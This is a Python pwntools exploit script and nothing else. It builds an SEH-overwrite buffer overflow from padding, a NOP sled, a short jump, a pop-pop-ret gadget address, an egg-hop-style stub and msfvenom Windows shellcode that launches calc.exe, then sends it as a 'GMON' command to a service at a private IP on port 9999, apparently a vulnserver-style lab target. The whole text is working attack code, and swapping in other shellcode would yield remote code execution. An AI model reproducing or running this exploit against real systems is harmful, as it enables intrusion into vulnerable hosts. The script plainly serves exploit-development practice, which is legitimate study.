#!/usr/bin/env python3

from pwn import *


size = 5100
lpad = b'\x41' * 3515
nops = b'\x90' * 64

jump       = b'\x90\x90\xeb\x06'        # nop; nop; jmp 0x8;
island_hop = b'TXf\x05\xb0\x05\xff\xe0' # push esp; pop eax; add ax, 0x5b0; jmp eax;

# msfvenom -p windows/exec -b '\x00' -f py CMD=calc.exe EXITFUNC=seh
shellcode =  b"\xda\xd3\xd9\x74\x24\xf4\x5a\xbe\x0c\x6b\xb6\xf7\x31"
shellcode += b"\xc9\xb1\x31\x31\x72\x18\x03\x72\x18\x83\xea\xf0\x89"
shellcode += b"\x43\x0b\xe0\xcc\xac\xf4\xf0\xb0\x25\x11\xc1\xf0\x52"
shellcode += b"\x51\x71\xc1\x11\x37\x7d\xaa\x74\xac\xf6\xde\x50\xc3"
shellcode += b"\xbf\x55\x87\xea\x40\xc5\xfb\x6d\xc2\x14\x28\x4e\xfb"
shellcode += b"\xd6\x3d\x8f\x3c\x0a\xcf\xdd\x95\x40\x62\xf2\x92\x1d"
shellcode += b"\xbf\x79\xe8\xb0\xc7\x9e\xb8\xb3\xe6\x30\xb3\xed\x28"
shellcode += b"\xb2\x10\x86\x60\xac\x75\xa3\x3b\x47\x4d\x5f\xba\x81"
shellcode += b"\x9c\xa0\x11\xec\x11\x53\x6b\x28\x95\x8c\x1e\x40\xe6"
shellcode += b"\x31\x19\x97\x95\xed\xac\x0c\x3d\x65\x16\xe9\xbc\xaa"
shellcode += b"\xc1\x7a\xb2\x07\x85\x25\xd6\x96\x4a\x5e\xe2\x13\x6d"
shellcode += b"\xb1\x63\x67\x4a\x15\x28\x33\xf3\x0c\x94\x92\x0c\x4e"
shellcode += b"\x77\x4a\xa9\x04\x95\x9f\xc0\x46\xf3\x5e\x56\xfd\xb1"
shellcode += b"\x61\x68\xfe\xe5\x09\x59\x75\x6a\x4d\x66\x5c\xcf\xaf"
shellcode += b"\x97\x6d\xc5\x38\x0e\x04\xa4\x24\xb1\xf2\xea\x50\x32"
shellcode += b"\xf7\x92\xa6\x2a\x72\x97\xe3\xec\x6e\xe5\x7c\x99\x90"
shellcode += b"\x5a\x7c\x88\xf2\x3d\xee\x50\xdb\xd8\x96\xf3\x23"

rpad = b'\x42' * (size - len(lpad) - 4 - 4 - len(island_hop))

payload = flat(
    nops, shellcode,
    lpad,
    jump, p32(0x625011b3), # pop eax; pop eax; ret
    island_hop,
    rpad
)

with remote('192.168.122.186', 9999) as r:
    r.writeline(b'GMON /.:/' + payload)

